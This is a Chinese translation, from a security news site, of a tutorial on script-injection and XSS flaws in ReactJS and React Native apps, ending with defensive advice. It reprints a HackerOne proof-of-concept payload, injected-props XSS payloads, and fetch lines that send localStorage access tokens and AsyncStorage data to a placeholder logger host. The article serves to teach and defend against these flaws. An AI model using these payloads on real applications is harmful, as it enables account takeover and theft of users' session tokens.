# 【技术分享】利用脚本注入漏洞攻击ReactJS应用程序

阅读量 **165235**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-08-07 09:57:22

 **x**

##### 译文声明

本文是翻译文章，文章来源：medium.com/@muellerberndt

原文地址：<https://medium.com/@muellerberndt/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1>

译文仅供参考，具体内容表达以及含义原文为准。

[](http://reactjs.com/)

译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

  

**[ReactJS](http://reactjs.com/)**
是一款能够帮助开发者构建用户接口的热门JavaScript库。在它的帮助下，开发者可以构建出内容丰富的客户端或Web应用，并且提前加载内容以提供更好的用户体验。

从设计角度来看，只要你能够按照开发标准来使用ReactJS的话，它其实是非常安全的。但是在网络安全领域中，没有任何东西是绝对安全的，而错误的编程实践方式将导致类似脚本注入漏洞之类的问题产生，这些错误的编程方式包括：

**1.利用用户提供的对象来创建React组件；**

**2.利用用户提供的href属性来配置 <a>标签，或利用其他可注入的属性来设置其他的HTML标签（例如link标签）；**

**3.显示地设置一个元素的dangerouslySetInnerHTML属性(危险的HTML标签属性)；**

**4.向eval()传递用户提供的字符串数据；**

接下来，让我们一起看一看这些潜在的问题将如何影响ReactJS应用程序，并最终导致了脚本注入漏洞的出现。

  

**组件、属性和元素**

在ReactJS应用程序中，组件是最基本的组成部分。从本质上来说，这些组件其实都类似于JavaScript函数，它们可以接受任意的输入数据，然后返回React元素。一个基本的ReactJS组件如下所示：

    
    
    class Welcome extends React.Component {
      render() {
    return <h1>Hello, {this.props.name}</h1>;
      }
    }

请注意上面代码中的return语句，这是一种JavaScript中的语句扩展（[ **JSX**](https://jsx.github.io/)
）。在项目构建的过程中，JSX代码将会被编译成常规的JavaScript（ES5）代码。下面给出的两种样本代码其功能是完全相同的：

    
    
    // JSX
    const element = (
      <h1 className=”greeting”>
      Hello, world!
      </h1>
    );
    // Transpiled to createElement() call
    const element = React.createElement(
      ‘h1’,
      {className: ‘greeting’},
      ‘Hello, world!’
    );
    在创建新的React元素时，使用的是component类中的createElement()函数：
    React.createElement(
      type,
      [props],
      [...children]
    )

这个函数可以接受三个参数：

1.type参数：该参数可以是一个标签名（例如'div'或'span'），或一个component类。但是在React
Native中只允许component类。

2.props参数：该参数包含一个传递给新元素的属性列表。

3.children参数：该参数包含新元素的子节点。

如果你能够控制其中任何一个参数的话，那么这个参数就会变成攻击向量。

  

**注入子节点**

早2015年3月份，Daniel
LeCheminant报告了一个存在于HackerOne的存储型跨站脚本漏洞（XSS）。这个漏洞的成因如下：HackerOne的Web应用会将用户所提供的任意对象当作children参数传递给React.createElement()函数。根据我们的推测，存在漏洞的代码可能跟下方给出的代码比较相似：

    
    
    /* Retrieve a user-supplied, stored value from the server and parsed it as JSON for whatever reason.
    attacker_supplied_value = JSON.parse(some_user_input)
    */
    render() { 
     return <span>{attacker_supplied_value}</span>;
    }

这段JSX代码将会被转译成如下所示的JavaScript代码：

    
    
    React.createElement("span", null, attacker_supplied_value};

如果其中的attacker_supplied_value是一个字符串的话（正常情况），代码将会生成一个正常的span元素。但是在当前版本的ReactJS中，createElement()函数还会接受以children参数形式传递的普通对象。Daniel通过一个JSON编码的对象利用了这个漏洞，他在这个对象中包含了dangerouslySetInnerHTML属性，这将允许他向React呈现的输出效果中注入原始的HTML代码。最终的PoC代码：

    
    
    {
     _isReactElement: true,
     _store: {},
     type: “body”,
     props: {
       dangerouslySetInnerHTML: {
         __html:
         "<h1>Arbitrary HTML</h1>
         <script>alert(‘No CSP Support :(‘)</script>
         <a href=’http://danlec.com'>link</a>"
        }
      }
    }

相关的漏洞缓解方案可以在[
**React.js的GitHub主页**](https://github.com/facebook/react/issues/3473)
上找到，感兴趣的同学可以参考。在2015年11月份，Sebastian Markbåge提交了一个[
**修复方案**](https://github.com/facebook/react/pull/4832) ：为React元素引入了$$typeof:
Symbol.for('react.element')属性。由于无法从一个注入对象引用全局JavaScript符号，所以Daniel设计的漏洞利用技术（注入child元素）就无法再使用了。

  

**控制元素类型**

虽然我们不能再将普通对象来当作ReactJS元素来使用了，但是组件注入并非不可能实现，因为createElement()函数还可以接受type参数中的字符串数据。我们假设开发者采用了如下所示的代码：

    
    
    // Dynamically create an element from a string stored in the backend.
    element_name = stored_value;
    React.createElement(element_name, null);

如果stored_value是一个由攻击者控制的字符串，那我们就可以创建任意的React组件了。但是此时创建的是一个普通的无属性HTML元素，而这种东西对于攻击者来说是没有任何作用的。因此，我们必须要能够控制新创建元素的属性才可以。

  

**注入属性（props）**

请大家先看看下面给出的这段代码：

    
    
    // Parse attacker-supplied JSON for some reason and pass
    // the resulting object as props.
    // Don't do this at home unless you are a trained expert!
    attacker_props = JSON.parse(stored_value)
    React.createElement("span", attacker_props};

这样一来，我们就可以向新元素中注入任意属性了。我们可以使用下面给出的Payload来设置dangerouslySetInnerHTML属性：

    
    
    {"dangerouslySetInnerHTML" : { "__html": "<img src=x/ onerror=’alert(localStorage.access_token)’>"}}

**跨站脚本漏洞**

某些传统的XSS攻击向量同样适用于ReactJS应用程序。请大家接着往下看：

**显示地设置dangerouslySetInnerHTML属性**

很多开发者可能会有目的地去设置dangerouslySetInnerHTML属性：

    
    
    <div dangerouslySetInnerHTML={user_supplied} />

很明显，如果你能够控制这些属性的参数值，那你就能够注入任意的JavaScript代码了。

**可注入的属性**

如果你能够控制一个动态生成的<a>标签的href属性，那就没有什么可以阻止你向其参数值中注入JavaScript代码（通过javascript:）了。除了href属性之外，在现代浏览器中HTML5按钮的formaction属性同样也是可注入的。

    
    
    <a href={userinput}>Link</a>
    <button form="name" formaction={userinput}>

另一个非常奇怪的注入向量就是HTML imports：

    
    
    <link rel=”import” href={user_supplied}>

**服务器端呈现的HTML**

为了降低初始化页面的呈现时间，很多开发人员会在服务器端预先加载React.JS页面（也就是所谓的“服务器端呈现”）。在2016年11月份，[
**Emilia Smith发现**](https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0') 官方[
**Redux**](http://redux.js.org/docs/recipes/ServerRendering.html)
代码样本中存在一个跨站脚本漏洞（XSS），因为客户端状态被嵌入到了预呈现页面中并没有被过滤掉。（[
**样本代码**](http://redux.js.org/docs/recipes/ServerRendering.html#inject-initial-component-html-and-state) 中的漏洞现在已经修复）

如果HTML页面在服务器端预呈现的话，你也许可以在普通的Web应用中找到类似的跨站脚本漏洞。

**基于eval()的注入**

如果应用程序使用了eval()来动态执行一个由你控制的注入字符串，那你就非常幸运了。在这种情况下，你就可以随意选择你需要注入的代码了：

    
    
    function antiPattern() {
      eval(this.state.attacker_supplied);
    }

**  
**

**XSS Payload**

在现代Web开发领域，很多机制的开发人员会选择使用无状态的会话令牌，并且将它们保存在客户端的本地存储中。因此，攻击者必须根据这种情况来设计相应的Payload。

当你在利用跨站脚本漏洞来攻击ReactJS
Web应用程序时，你能够随意注入任意代码，如果再配合使用下面列出的代码，你就可以从目标设备的本地存储中获取访问令牌并将其发送到你的记录程序中：

    
    
    fetch(‘http://example.com/logger.php?
    token='+localStorage.access_token);

**  
**

**React Native**

[**React Native**](https://facebook.github.io/react-native/)
是一款移动应用开发框架，它可以帮助开发人员使用ReactJS构建原生移动应用。更确切地说，它提供了一个能够再移动设备上运行React
JavaScript包的运行时环境。除此之外，我们还可以使用React Native for Web让一个React
Native应用在普通的Web浏览器中运行。

但是就我们目前的研究结果来看，上面列出的脚本注入向量都不适用于React Native：

1.React
Native的createInternalComponent方法只接受包含标签的component类，所以即便是你能够完全控制传递给createElement()的参数，你野无法创建任意元素；

2.不存在HTML元素，HTML代码也不会被解析，所以普通的基于浏览器的XSS向量（例如'href'）就无法正常工作了。

只有基于eval()的变量才可以在移动设备上被攻击者利用。如果你能够通过eval()注入JavaScript代码，你就可以访问React Native
API并做一些有趣的事情了。比如说，你可以从本地存储(AsyncStorage)中窃取数据了，相关的操作代码如下所示：

    
    
    _reactNative.AsyncStorage.getAllKeys(function(err,result)
    {_reactNative.AsyncStorage.multiGet(result,function(err,result)
    {fetch(‘http://example.com/logger.php?
    token='+JSON.stringify(result));});});

**  
**

**建议**

虽然从设计的角度出发，ReactJS还是非常安全的，但是这个世界上没有绝对安全的东西，不好的编程习惯将导致各种严重的安全漏洞出现：

我们建议各位开发者们不要再使用eval()函数或dangerouslySetInnerHTML属性，并避免解析用户提供的JSON数据。

本文翻译自medium.com/@muellerberndt
[原文链接](https://medium.com/@muellerberndt/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86566](/post/id/86566)

安全客 - 有思想的安全新媒体

本文转载自:
[medium.com/@muellerberndt](https://medium.com/@muellerberndt/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1)

如若转载,请注明出处： <https://medium.com/@muellerberndt/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

